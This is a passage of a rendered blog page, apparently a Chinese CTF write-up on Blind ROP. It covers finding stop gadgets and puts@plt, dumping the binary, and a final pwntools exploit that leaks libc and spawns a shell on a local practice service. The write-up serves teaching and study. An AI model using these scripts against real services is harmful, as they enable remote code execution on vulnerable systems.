+		<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">72</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
+		<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+		<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+		<span class="k">try</span><span class="p">:</span>
+		    <span class="n">output</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+		    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"find gadgets at 0x</span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">address</span><span class="p">)</span>
+		    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+		    <span class="k">return</span>
+		<span class="k">except</span> <span class="nb">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span> 
+		    <span class="n">address</span> <span class="o">+=</span> <span class="mi">1</span>
+		    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+		    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"dead connection! at 0x</span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">address</span><span class="p">)</span>
+		<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+		    
+<span class="n">get_gadgets_addr</span><span class="p">(</span><span class="mh">0x004006ad</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="images/Snipaste_2019-03-04_11-15-13.png" alt="Snipaste_2019-03-04_11-15-13" /></p>
+
+<p><img src="images/Snipaste_2019-03-04_11-15-41.png" alt="Snipaste_2019-03-04_11-15-41" /></p>
+
+<p>到这里我们就确定了stop gadget 和 ret2csu的地址。</p>
+
+<h2 id="寻找plt">寻找plt</h2>
+
+<p>如下图所示，程序的 plt 表具有比较规整的结构，每一个 plt 表项都是 16 字节。而且，在每一个表项的 6 字节偏移处，是该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 地址进行解析。</p>
+
+<p><img src="images/brop_plt.png" alt="brop_plt" /></p>
+
+<p>此外，对于大多数 plt 调用来说，一般都不容易崩溃，即使是使用了比较奇怪的参数。所以说，如果我们发现了一系列的长度为 16 的没有使得程序崩溃的代码段，那么我们有一定的理由相信我们遇到了 plt 表。除此之外，我们还可以通过前后偏移 6 字节，来判断我们是处于 plt 表项中间还是说处于开头。</p>
+
+<p><img src="images/Snipaste_2019-03-04_11-33-13.png" alt="Snipaste_2019-03-04_11-33-13" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ppppppr_addr</span> <span class="o">=</span> <span class="mh">0x4007aa</span>
+<span class="n">gadget2</span> <span class="o">=</span> <span class="n">ppppppr_addr</span> <span class="o">-</span> <span class="mh">0x1a</span>
+<span class="n">gadget1</span> <span class="o">=</span> <span class="n">ppppppr_addr</span>
+<span class="n">pop_rid_ret</span> <span class="o">=</span> <span class="n">ppppppr_addr</span> <span class="o">+</span> <span class="mi">9</span>
+<span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x004006ad</span>
+
+<span class="c1"># get puts@plt
+</span><span class="k">def</span> <span class="nf">get_puts_addr</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
+    <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
+    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+        <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">1111</span><span class="p">)</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">content</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+            <span class="k">if</span> <span class="n">content</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">ELF'</span><span class="p">):</span>
+                <span class="k">print</span> <span class="s">'find puts@plt addr: 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">addr</span>
+                <span class="k">return</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="k">print</span> <span class="n">get_puts_addr</span><span class="p">(</span><span class="mi">72</span><span class="p">,</span> <span class="n">pop_rid_ret</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">)</span>
+<span class="c1">#puts_plt = 0x400560
+</span></code></pre></div></div>
+
+<p>在进行测试时，我得到了这么几个地址的值，为了确定哪个是真正的puts@plt的地址，我们可以进行分析。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x400555</span>
+<span class="mh">0x400557</span>
+<span class="mh">0x40055c</span>
+<span class="mh">0x40055e</span>
+<span class="mh">0x40055f</span>
+<span class="mh">0x400560</span>
+<span class="mh">0x400561</span>
+<span class="mh">0x400566</span>
+</code></pre></div></div>
+
+<ul>
+  <li>在puts@plt没有解析过时，plt表中函数第一条指令是跳转到对应的got表中，此时got表中存储的是plt表中的第二条指令，然后进行压栈，并跳转到plt表首，然后进入dl_resolve进行延时绑定，将函数地址写入got表中。</li>
+  <li>在puts@plt经过解析后，plt表中的函数地址第一条仍然不变，但是got表中的值变成了真正的函数值，所以此时会直接跳转到真正的函数入口处，不会再跳转到plt表中。</li>
+</ul>
+
+<p>所以，基于elf文件的延时绑定机制，对于上面我们得到的疑似puts@plt的地址，前面几个肯定是在plt表项前面的指令，这样顺序执行指令也不有问题。而最后一个能真确执行puts的地址，肯定是属于puts@plt没有解析的情况下，程序进入plt表首，然后调用dl_resolve来调用puts函数，所以最后一个地址是puts@plt的第二条指令，即压栈操作，而压栈操作是在plt表函数的第二条位置，偏移量是6，所以我们就能得到正确的puts_plt的函数地址是0x400560。</p>
+
+<h2 id="dump文件">dump文件</h2>
+
+<p>在我们可以调用 puts 函数后，我们可以泄露 puts 函数的地址，进而获取 libc 版本，从而获取相关的 system 函数地址与 / bin/sh 地址，从而获取 shell。我们从 0x400000 开始泄露 0x1000 个字节，这已经足够包含程序的 plt 部分了。
+代码如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># dump file
+</span><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">):</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">1111</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="n">data</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s">"WelCome"</span><span class="p">)]</span>
+        <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">data</span>
+        <span class="c1">#print len(data)
+</span>        <span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+        <span class="k">return</span> <span class="n">data</span>
+    <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
+        <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">None</span>
+
+<span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
+<span class="n">brop_gadget</span> <span class="o">=</span> <span class="mh">0x4007aa</span>
+<span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x4006AD</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400560</span>
+<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400500</span>
+<span class="n">rdi_ret</span> <span class="o">=</span> <span class="n">brop_gadget</span> <span class="o">+</span> <span class="mi">9</span>
+<span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">while</span> <span class="n">addr</span> <span class="o">&lt;</span> <span class="mh">0x400600</span><span class="p">:</span>
+    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">leak</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">else</span><span class="p">:</span>
+    	<span class="k">if</span> <span class="n">data</span> <span class="o">==</span> <span class="s">'</span><span class="se">\x0a</span><span class="s">'</span><span class="p">:</span>
+    		<span class="n">data</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="n">data</span>
+    <span class="n">addr</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'code'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="images/Snipaste_2019-03-04_13-00-41.png" alt="Snipaste_2019-03-04_13-00-41" /></p>
+
+<p>这说明，puts@got 的地址为 0x601018。然后我们进行整体的程序利用就行了。</p>
+
+<h1 id="exploit">exploit</h1>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+
+<span class="n">ip</span> <span class="o">=</span> <span class="s">'127.0.0.1'</span> 
+<span class="n">port</span> <span class="o">=</span> <span class="mi">1111</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'gnome-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">,</span> <span class="s">'sh'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">]</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./brop"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+
+<span class="c1">#length = getbufferflow_length()
+</span><span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
+<span class="c1">#stop_gadget = get_stop_addr(length)
+</span><span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x4006ad</span>
+<span class="c1">#ppppppr_addr = find_brop_gadget(length, stop_gadget)
+</span><span class="n">ppppppr_addr</span> <span class="o">=</span> <span class="mh">0x4007aa</span>
+<span class="n">gadget1</span> <span class="o">=</span> <span class="n">ppppppr_addr</span>
+<span class="n">gadget2</span> <span class="o">=</span> <span class="n">ppppppr_addr</span> <span class="o">-</span> <span class="mh">0x1a</span>
+<span class="n">rdi_ret</span> <span class="o">=</span> <span class="n">ppppppr_addr</span> <span class="o">+</span> <span class="mi">9</span>
+<span class="c1">#puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)
+</span><span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400560</span>
+<span class="c1"># puts_got = 0x601018
+</span><span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+
+<span class="c1">#s = gdb.debug('./brop','''
+#b main
+#''')
+</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"puts_addr -&gt; {:#x}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
+
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc address -&gt; {:#x}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="n">length</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x45254</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1">#s.recv()
+</span><span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="images/Snipaste_2019-03-04_13-49-05.png" alt="Snipaste_2019-03-04_13-49-05" /></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#pwn" class="page__taxonomy-item" rel="tag">pwn</a>
+    
+    </span>
+  </p>
+
+
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-02T21:26:00+08:00">March 02, 2019</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnit+4%20http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-4.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-4.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2019-03%2FPwnit-4.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/posts/2019-03/Pwnit-3.html" class="pagination--pager" title="Pwnit 3
+">Previous</a>
+    
+    
+      <a href="/posts/2019-03/Pwnit-5.html" class="pagination--pager" title="Pwnit 5
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/posts/2019-11/Dirary_November.html" rel="permalink">Dirary_november
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  less than 1 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+  每日所作所得
+
+
+
+
+11月1日
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/posts/2019-10/Software_Security_Project.html" rel="permalink">Software_security_project
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  less than 1 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+  Malware
+vs2010
+
+
+
+
+InfoCollection
+
+configure
+
+
+
+warning
+
+
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/posts/2019-10/Pacman_Helper.html" rel="permalink">Pacman_helper
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  1 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+  pacman 手册
+
+
+
+
+archlinux pacman 命令
+arch wiki
+
+pacman -Sy 仅同步源
+
+pacman -Syu 同步源，并更新系统
+
+pacman -Su –ignore foo 升级时不升级包foo
+
+pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/posts/2019-10/%E5%8D%81%E6%9C%88%E6%97%A5%E8%AE%B0.html" rel="permalink">十月日记
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  less than 1 minute read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+  每日所作所得
+
+
+
+
+10月1日
+
+周日，上课前最后一天，算是给自己放了最后一天假期
+
+10月2日
+
+上了第一天的课，主要是os，一脸蒙蔽。
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2019 Blogger. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/posts/2019-03/Pwnit-4.html";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/posts/2019-03/Pwnit-4"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://zjgcjy-github-io.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+
+  </body>
+</html>
